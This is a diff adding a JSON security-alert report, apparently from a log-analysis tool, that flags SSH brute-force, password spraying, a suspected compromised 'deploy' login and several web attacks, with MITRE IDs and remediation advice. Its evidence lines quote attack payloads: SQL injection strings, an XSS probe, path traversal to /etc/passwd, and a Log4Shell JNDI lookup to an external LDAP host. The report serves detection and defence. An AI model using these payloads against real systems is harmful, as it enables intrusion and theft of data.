@@ -1,0 +1,442 @@
+{
+  "generated_at": "2026-10-02T21:36:54.039210+00:00",
+  "summary": {
+    "events_total": 796,
+    "events_auth": 380,
+    "events_web": 416,
+    "alerts_total": 15,
+    "by_severity": {
+      "critical": 1,
+      "high": 6,
+      "medium": 7,
+      "low": 1
+    },
+    "by_rule": {
+      "SSH-COMPROMISE": 1,
+      "SSH-BRUTE": 2,
+      "WEB-PAYLOAD": 4,
+      "SSH-SPRAY": 1,
+      "WEB-SCAN": 1,
+      "WEB-SCANNER-UA": 2,
+      "SSH-DIST-USER": 1,
+      "WEB-LOGIN-BURST": 1,
+      "WEB-PROBE": 1,
+      "SSH-DIST-GLOBAL": 1
+    },
+    "top_ips": [
+      {
+        "ip": "203.0.113.77",
+        "alerts": 2,
+        "worst": "critical"
+      },
+      {
+        "ip": "203.0.113.9",
+        "alerts": 4,
+        "worst": "high"
+      },
+      {
+        "ip": "198.51.100.23",
+        "alerts": 1,
+        "worst": "high"
+      },
+      {
+        "ip": "203.0.113.30",
+        "alerts": 1,
+        "worst": "high"
+      },
+      {
+        "ip": "203.0.113.50",
+        "alerts": 1,
+        "worst": "high"
+      },
+      {
+        "ip": "198.51.100.99",
+        "alerts": 2,
+        "worst": "medium"
+      },
+      {
+        "ip": "198.51.100.200",
+        "alerts": 1,
+        "worst": "medium"
+      },
+      {
+        "ip": "203.0.113.101",
+        "alerts": 1,
+        "worst": "medium"
+      },
+      {
+        "ip": "203.0.113.102",
+        "alerts": 1,
+        "worst": "medium"
+      },
+      {
+        "ip": "203.0.113.103",
+        "alerts": 1,
+        "worst": "medium"
+      }
+    ]
+  },
+  "alerts": [
+    {
+      "rule_id": "SSH-COMPROMISE",
+      "title": "Successful SSH login after repeated failures",
+      "severity": "critical",
+      "ip": "203.0.113.77",
+      "first_seen": "2026-10-01T14:45:19+00:00",
+      "last_seen": "2026-10-01T14:48:40+00:00",
+      "count": 15,
+      "mitre": {
+        "id": "T1078",
+        "name": "Valid Accounts"
+      },
+      "description": "Login succeeded for 'deploy' (password) after 14 failed attempts in 900s (14 against this account). Credentials may be compromised.",
+      "recommendation": "Treat as an incident: check what the session did, reset the account's credentials, kill active sessions, and review other logins from this IP.",
+      "evidence": [
+        "Oct  1 14:45:19 web01 sshd[1019]: Failed password for deploy from 203.0.113.77 port 41000 ssh2",
+        "Oct  1 14:45:38 web01 sshd[1038]: Failed password for deploy from 203.0.113.77 port 41001 ssh2",
+        "Oct  1 14:48:40 web01 sshd[1040]: Accepted password for deploy from 203.0.113.77 port 41099 ssh2"
+      ],
+      "sources": []
+    },
+    {
+      "rule_id": "SSH-BRUTE",
+      "title": "SSH brute-force attempt",
+      "severity": "high",
+      "ip": "203.0.113.50",
+      "first_seen": "2026-10-01T11:10:03+00:00",
+      "last_seen": "2026-10-01T11:12:29+00:00",
+      "count": 60,
+      "mitre": {
+        "id": "T1110.001",
+        "name": "Brute Force: Password Guessing"
+      },
+      "description": "60 failed SSH logins within 300s (4 account(s) targeted, most targeted: 'root' x35).",
+      "recommendation": "Block or rate-limit the source IP, disable password login (use SSH keys), and deploy fail2ban or an equivalent.",
+      "evidence": [
+        "Oct  1 11:10:03 web01 sshd[1003]: Failed password for root from 203.0.113.50 port 30000 ssh2",
+        "Oct  1 11:10:05 web01 sshd[1005]: Failed password for root from 203.0.113.50 port 30001 ssh2",
+        "Oct  1 11:10:08 web01 sshd[1008]: Failed password for root from 203.0.113.50 port 30002 ssh2"
+      ],
+      "sources": []
+    },
+    {
+      "rule_id": "WEB-PAYLOAD",
+      "title": "Web attack payload: SQL injection",
+      "severity": "high",
+      "ip": "203.0.113.9",
+      "first_seen": "2026-10-01T13:02:03+00:00",
+      "last_seen": "2026-10-01T13:02:57+00:00",
+      "count": 20,
+      "mitre": {
+        "id": "T1190",
+        "name": "Exploit Public-Facing Application"
+      },
+      "description": "20 request(s) contain SQL injection patterns. 7 of them got a 2xx response, so check those first.",
+      "recommendation": "Block the IP, review the targeted endpoints for input validation, and put a WAF in front of the application. Check app logs for signs of success.",
+      "evidence": [
+        "203.0.113.9 - - [01/Oct/2026:13:02:03 +0000] \"GET /products?id=1%27%20OR%20%271%27%3D%271 HTTP/1.1\" 500 3772 \"-\" \"sqlmap/1.7.2#stable (https://sqlmap.org)\"",
+        "203.0.113.9 - - [01/Oct/2026:13:02:04 +0000] \"GET /products?id=1%20UNION%20SELECT%20NULL,NULL,NULL-- HTTP/1.1\" 200 3233 \"-\" \"sqlmap/1.7.2#stable (https://sqlmap.org)\"",
+        "203.0.113.9 - - [01/Oct/2026:13:02:05 +0000] \"GET /products?id=1%20AND%20SLEEP(5) HTTP/1.1\" 500 1997 \"-\" \"sqlmap/1.7.2#stable (https://sqlmap.org)\""
+      ],
+      "sources": []
+    },
+    {
+      "rule_id": "SSH-SPRAY",
+      "title": "SSH password spraying",
+      "severity": "high",
+      "ip": "198.51.100.23",
+      "first_seen": "2026-10-01T13:30:20+00:00",
+      "last_seen": "2026-10-01T13:33:15+00:00",
+      "count": 12,
+      "mitre": {
+        "id": "T1110.003",
+        "name": "Brute Force: Password Spraying"
+      },
+      "description": "12 failed logins across 12 different accounts in 600s (about 1.0 tries per account).",
+      "recommendation": "Block the source IP, enforce MFA or key-only SSH, and check whether any of the targeted accounts later logged in successfully.",
+      "evidence": [
+        "Oct  1 13:30:20 web01 sshd[1020]: Failed password for invalid user root from 198.51.100.23 port 54967 ssh2",
+        "Oct  1 13:30:34 web01 sshd[1034]: Failed password for invalid user admin from 198.51.100.23 port 46635 ssh2",
+        "Oct  1 13:30:47 web01 sshd[1047]: Failed password for invalid user oracle from 198.51.100.23 port 58525 ssh2"
+      ],
+      "sources": []
+    },
+    {
+      "rule_id": "WEB-PAYLOAD",
+      "title": "Web attack payload: Cross-site scripting",
+      "severity": "high",
+      "ip": "203.0.113.30",
+      "first_seen": "2026-10-01T10:40:05+00:00",
+      "last_seen": "2026-10-01T10:40:15+00:00",
+      "count": 3,
+      "mitre": {
+        "id": "T1190",
+        "name": "Exploit Public-Facing Application"
+      },
+      "description": "3 request(s) contain Cross-site scripting patterns. 3 of them got a 2xx response, so check those first.",
+      "recommendation": "Block the IP, review the targeted endpoints for input validation, and put a WAF in front of the application. Check app logs for signs of success.",
+      "evidence": [
+        "203.0.113.30 - - [01/Oct/2026:10:40:05 +0000] \"GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1\" 200 3100 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/118.0 Safari/537.36\"",
+        "203.0.113.30 - - [01/Oct/2026:10:40:10 +0000] \"GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1\" 200 3100 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/118.0 Safari/537.36\"",
+        "203.0.113.30 - - [01/Oct/2026:10:40:15 +0000] \"GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1\" 200 3100 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/118.0 Safari/537.36\""
+      ],
+      "sources": []
+    },
+    {
+      "rule_id": "WEB-PAYLOAD",
+      "title": "Web attack payload: Path traversal",
+      "severity": "high",
+      "ip": "203.0.113.9",
+      "first_seen": "2026-10-01T13:02:59+00:00",
+      "last_seen": "2026-10-01T13:03:03+00:00",
+      "count": 3,
+      "mitre": {
+        "id": "T1190",
+        "name": "Exploit Public-Facing Application"
+      },
+      "description": "3 request(s) contain Path traversal patterns. None returned 2xx.",
+      "recommendation": "Block the IP, review the targeted endpoints for input validation, and put a WAF in front of the application. Check app logs for signs of success.",
+      "evidence": [
+        "203.0.113.9 - - [01/Oct/2026:13:02:59 +0000] \"GET /download?file=../../../../etc/passwd HTTP/1.1\" 400 150 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/118.0 Safari/537.36\"",
+        "203.0.113.9 - - [01/Oct/2026:13:03:01 +0000] \"GET /download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd HTTP/1.1\" 400 150 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/118.0 Safari/537.36\"",
+        "203.0.113.9 - - [01/Oct/2026:13:03:03 +0000] \"GET /download?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd HTTP/1.1\" 400 150 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/118.0 Safari/537.36"
+      ],
+      "sources": []
+    },
+    {
+      "rule_id": "WEB-PAYLOAD",
+      "title": "Web attack payload: Log4Shell (JNDI) lookup",
+      "severity": "high",
+      "ip": "203.0.113.9",
+      "first_seen": "2026-10-01T13:03:05+00:00",
+      "last_seen": "2026-10-01T13:03:05+00:00",
+      "count": 1,
+      "mitre": {
+        "id": "T1190",
+        "name": "Exploit Public-Facing Application"
+      },
+      "description": "1 request(s) contain Log4Shell (JNDI) lookup patterns. 1 of them got a 2xx response, so check those first.",
+      "recommendation": "Block the IP, review the targeted endpoints for input validation, and put a WAF in front of the application. Check app logs for signs of success.",
+      "evidence": [
+        "203.0.113.9 - - [01/Oct/2026:13:03:05 +0000] \"GET /?q=%24%7Bjndi%3Aldap%3A%2F%2F198.51.100.5%3A1389%2Fa%7D HTTP/1.1\" 200 5000 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/118.0 Safari/537.36\""
+      ],
+      "sources": []
+    },
+    {
+      "rule_id": "WEB-SCAN",
+      "title": "Web content discovery (many 404 errors)",
+      "severity": "medium",
+      "ip": "198.51.100.99",
+      "first_seen": "2026-10-01T12:05:01+00:00",
+      "last_seen": "2026-10-01T12:05:43+00:00",
+      "count": 40,
+      "mitre": {
+        "id": "T1595.003",
+        "name": "Active Scanning: Wordlist Scanning"
+      },
+      "description": "40 different missing pages requested within 120s.",
+      "recommendation": "Rate-limit or block the IP at the WAF/firewall and make sure no forgotten files are exposed.",
+      "evidence": [
+        "198.51.100.99 - - [01/Oct/2026:12:05:01 +0000] \"GET /admin/ HTTP/1.1\" 404 196 \"-\" \"Mozilla/5.00 (Nikto/2.1.6) (Evasions:None)\"",
+        "198.51.100.99 - - [01/Oct/2026:12:05:01 +0000] \"GET /backup.zip HTTP/1.1\" 404 196 \"-\" \"Mozilla/5.00 (Nikto/2.1.6) (Evasions:None)\"",
+        "198.51.100.99 - - [01/Oct/2026:12:05:03 +0000] \"GET /test.php HTTP/1.1\" 404 196 \"-\" \"Mozilla/5.00 (Nikto/2.1.6) (Evasions:None)\""
+      ],
+      "sources": []
+    },
+    {
+      "rule_id": "WEB-SCANNER-UA",
+      "title": "Known security scanner user agent",
+      "severity": "medium",
+      "ip": "198.51.100.99",
+      "first_seen": "2026-10-01T12:05:01+00:00",
+      "last_seen": "2026-10-01T12:05:43+00:00",
+      "count": 40,
+      "mitre": {
+        "id": "T1595.002",
+        "name": "Active Scanning: Vulnerability Scanning"
+      },
+      "description": "40 request(s) identify themselves as: nikto. Attackers can fake or hide this, so its absence proves nothing.",
+      "recommendation": "Block the IP unless this is an authorized scan you scheduled.",
+      "evidence": [
+        "198.51.100.99 - - [01/Oct/2026:12:05:01 +0000] \"GET /admin/ HTTP/1.1\" 404 196 \"-\" \"Mozilla/5.00 (Nikto/2.1.6) (Evasions:None)\"",
+        "198.51.100.99 - - [01/Oct/2026:12:05:01 +0000] \"GET /backup.zip HTTP/1.1\" 404 196 \"-\" \"Mozilla/5.00 (Nikto/2.1.6) (Evasions:None)\"",
+        "198.51.100.99 - - [01/Oct/2026:12:05:03 +0000] \"GET /test.php HTTP/1.1\" 404 196 \"-\" \"Mozilla/5.00 (Nikto/2.1.6) (Evasions:None)\""
+      ],
+      "sources": []
+    },
+    {
+      "rule_id": "WEB-SCANNER-UA",
+      "title": "Known security scanner user agent",
+      "severity": "medium",
+      "ip": "203.0.113.9",
+      "first_seen": "2026-10-01T13:02:03+00:00",
+      "last_seen": "2026-10-01T13:02:57+00:00",
+      "count": 25,
+      "mitre": {
+        "id": "T1595.002",
+        "name": "Active Scanning: Vulnerability Scanning"
+      },
+      "description": "25 request(s) identify themselves as: sqlmap. Attackers can fake or hide this, so its absence proves nothing.",
+      "recommendation": "Block the IP unless this is an authorized scan you scheduled.",
+      "evidence": [
+        "203.0.113.9 - - [01/Oct/2026:13:02:03 +0000] \"GET /products?id=1%27%20OR%20%271%27%3D%271 HTTP/1.1\" 500 3772 \"-\" \"sqlmap/1.7.2#stable (https://sqlmap.org)\"",
+        "203.0.113.9 - - [01/Oct/2026:13:02:04 +0000] \"GET /products?id=1%20UNION%20SELECT%20NULL,NULL,NULL-- HTTP/1.1\" 200 3233 \"-\" \"sqlmap/1.7.2#stable (https://sqlmap.org)\"",
+        "203.0.113.9 - - [01/Oct/2026:13:02:05 +0000] \"GET /products?id=1%20AND%20SLEEP(5) HTTP/1.1\" 500 1997 \"-\" \"sqlmap/1.7.2#stable (https://sqlmap.org)\""
+      ],
+      "sources": []
+    },
+    {
+      "rule_id": "SSH-DIST-USER",
+      "title": "Distributed attack on one account ('root')",
+      "severity": "medium",
+      "ip": "multiple (6 IPs)",
+      "first_seen": "2026-10-01T09:20:04+00:00",
+      "last_seen": "2026-10-01T09:22:15+00:00",
+      "count": 24,
+      "mitre": {
+        "id": "T1110.001",
+        "name": "Brute Force: Password Guessing"
+      },
+      "description": "24 failed logins against 'root' from 6 different IPs within 300s. No single IP crossed the per-IP threshold, which is how attackers try to stay unnoticed.",
+      "recommendation": "Do not auto-lock the account (attackers can abuse lockouts to deny service). Tell the account owner, require MFA or key-only login, and check whether this account had a successful login from any of these IPs.",
+      "evidence": [
+        "Oct  1 09:20:04 web01 sshd[1004]: Failed password for root from 203.0.113.101 port 32098 ssh2",
+        "Oct  1 09:20:09 web01 sshd[1009]: Failed password for root from 203.0.113.102 port 30689 ssh2",
+        "Oct  1 09:20:16 web01 sshd[1016]: Failed password for root from 203.0.113.103 port 48150 ssh2"
+      ],
+      "sources": [
+        "203.0.113.101",
+        "203.0.113.102",
+        "203.0.113.103",
+        "203.0.113.104",
+        "203.0.113.105",
+        "203.0.113.106"
+      ]
+    },
+    {
+      "rule_id": "WEB-LOGIN-BURST",
+      "title": "Burst of web login requests",
+      "severity": "medium",
+      "ip": "198.51.100.200",
+      "first_seen": "2026-10-01T16:20:06+00:00",
+      "last_seen": "2026-10-01T16:21:53+00:00",
+      "count": 18,
+      "mitre": {
+        "id": "T1110",
+        "name": "Brute Force"
+      },
+      "description": "18 login POST requests within 300s (status codes -> 401: 18).",
+      "recommendation": "Add rate limiting and account lockout or CAPTCHA, and require MFA. Check whether any request in the burst succeeded.",
+      "evidence": [
+        "198.51.100.200 - - [01/Oct/2026:16:20:06 +0000] \"POST /api/login HTTP/1.1\" 401 64 \"-\" \"python-requests/2.31.0\"",
+        "198.51.100.200 - - [01/Oct/2026:16:20:15 +0000] \"POST /api/login HTTP/1.1\" 401 64 \"-\" \"python-requests/2.31.0\"",
+        "198.51.100.200 - - [01/Oct/2026:16:20:19 +0000] \"POST /api/login HTTP/1.1\" 401 64 \"-\" \"python-requests/2.31.0\""
+      ],
+      "sources": []
+    },
+    {
+      "rule_id": "SSH-BRUTE",
+      "title": "SSH brute-force attempt",
+      "severity": "medium",
+      "ip": "203.0.113.77",
+      "first_seen": "2026-10-01T14:45:19+00:00",
+      "last_seen": "2026-10-01T14:48:29+00:00",
+      "count": 14,
+      "mitre": {
+        "id": "T1110.001",
+        "name": "Brute Force: Password Guessing"
+      },
+      "description": "14 failed SSH logins within 300s (1 account(s) targeted, most targeted: 'deploy' x14).",
+      "recommendation": "Block or rate-limit the source IP, disable password login (use SSH keys), and deploy fail2ban or an equivalent.",
+      "evidence": [
+        "Oct  1 14:45:19 web01 sshd[1019]: Failed password for deploy from 203.0.113.77 port 41000 ssh2",
+        "Oct  1 14:45:38 web01 sshd[1038]: Failed password for deploy from 203.0.113.77 port 41001 ssh2",
+        "Oct  1 14:45:49 web01 sshd[1049]: Failed password for deploy from 203.0.113.77 port 41002 ssh2"
+      ],
+      "sources": []
+    },
+    {
+      "rule_id": "WEB-PROBE",
+      "title": "Probing for sensitive files and admin panels",
+      "severity": "medium",
+      "ip": "203.0.113.120",
+      "first_seen": "2026-10-01T15:15:07+00:00",
+      "last_seen": "2026-10-01T15:15:30+00:00",
+      "count": 6,
+      "mitre": {
+        "id": "T1595.002",
+        "name": "Active Scanning: Vulnerability Scanning"
+      },
+      "description": "6 different sensitive paths requested (e.g. /.env, /.git/config, /phpmyadmin/).",
+      "recommendation": "Make sure these paths are not reachable from the internet and restrict admin panels by IP or VPN.",
+      "evidence": [
+        "203.0.113.120 - - [01/Oct/2026:15:15:07 +0000] \"GET /.env HTTP/1.1\" 404 196 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/118.0 Safari/537.36\"",
+        "203.0.113.120 - - [01/Oct/2026:15:15:11 +0000] \"GET /.git/config HTTP/1.1\" 404 196 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/118.0 Safari/537.36\"",
+        "203.0.113.120 - - [01/Oct/2026:15:15:17 +0000] \"GET /wp-login.php HTTP/1.1\" 404 196 \"-\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/118.0 Safari/537.36\""
+      ],
+      "sources": []
+    },
+    {
+      "rule_id": "SSH-DIST-GLOBAL",
+      "title": "Server-wide surge of failed SSH logins",
+      "severity": "low",
+      "ip": "multiple (40 IPs)",
+      "first_seen": "2026-10-01T15:30:03+00:00",
+      "last_seen": "2026-10-01T15:33:52+00:00",
+      "count": 120,
+      "mitre": {
+        "id": "T1110",
+        "name": "Brute Force"
+      },
+      "description": "120 failed logins from 40 IPs across 15 accounts within 300s. Internet-facing servers always get some background noise, so compare with your normal level before acting.",
+      "recommendation": "Low priority. Check whether this is above your usual level, confirm that password login is disabled or rate limited, and consider restricting SSH to a VPN.",
+      "evidence": [
+        "Oct  1 15:30:03 web01 sshd[1003]: Failed password for root from 198.51.100.110 port 51412 ssh2",
+        "Oct  1 15:30:06 web01 sshd[1006]: Failed password for invalid user admin from 198.51.100.111 port 33224 ssh2",
+        "Oct  1 15:30:07 web01 sshd[1007]: Failed password for invalid user oracle from 198.51.100.112 port 43193 ssh2"
+      ],
+      "sources": [
+        "198.51.100.110",
+        "198.51.100.111",
+        "198.51.100.112",
+        "198.51.100.113",
+        "198.51.100.114",
+        "198.51.100.115",
+        "198.51.100.116",
+        "198.51.100.117",
+        "198.51.100.118",
+        "198.51.100.119",
+        "198.51.100.120",
+        "198.51.100.121",
+        "198.51.100.122",
+        "198.51.100.123",
+        "198.51.100.124",
+        "198.51.100.125",
+        "198.51.100.126",
+        "198.51.100.127",
+        "198.51.100.128",
+        "198.51.100.129",
+        "198.51.100.130",
+        "198.51.100.131",
+        "198.51.100.132",
+        "198.51.100.133",
+        "198.51.100.134",
+        "198.51.100.135",
+        "198.51.100.136",
+        "198.51.100.137",
+        "198.51.100.138",
+        "198.51.100.139",
+        "198.51.100.140",
+        "198.51.100.141",
+        "198.51.100.142",
+        "198.51.100.143",
+        "198.51.100.144",
+        "198.51.100.145",
+        "198.51.100.146",
+        "198.51.100.147",
+        "198.51.100.148",
+        "198.51.100.149"
+      ]
+    }
+  ]
+}
